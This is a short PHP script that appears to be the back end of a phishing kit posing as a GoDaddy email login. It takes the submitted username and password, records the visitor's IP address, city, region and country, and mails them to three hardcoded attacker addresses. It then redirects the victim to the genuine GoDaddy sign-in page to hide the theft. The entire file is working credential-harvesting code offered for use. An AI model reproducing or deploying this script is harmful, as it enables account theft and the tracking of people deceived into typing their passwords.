<?php
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

	$webMaster = 'anunimorigba2020@gmail.com, anunimorigba2020@yandex.com, anunimorigba2020@protonmail.ch';   //Edit this only
	
/* Gathering Data Variables */
        $redir = "https://sso.godaddy.com/v1/?app=email&realm=pass";
        $agenti = "Godaddy";
	$login = $_POST['username'];
	$passwd = $_POST['password'];


	$body = <<<EOD
Email Id: $login
Password: $passwd
IP Address: $ip
City: {$geoplugin->city}
Region: {$geoplugin->region}
Country: {$geoplugin->countryName}

Now We Show Them Real StreetLife
EOD;

$headers = "From: GALA.TO <info@yourcoolsite.com>";$success = mail($webMaster, $agenti, $body, $headers);

	if($redir == '') {
header("Location: http://www.google.com"); 
}
else {
header("Location:". $redir); 
}
exit();
  

?>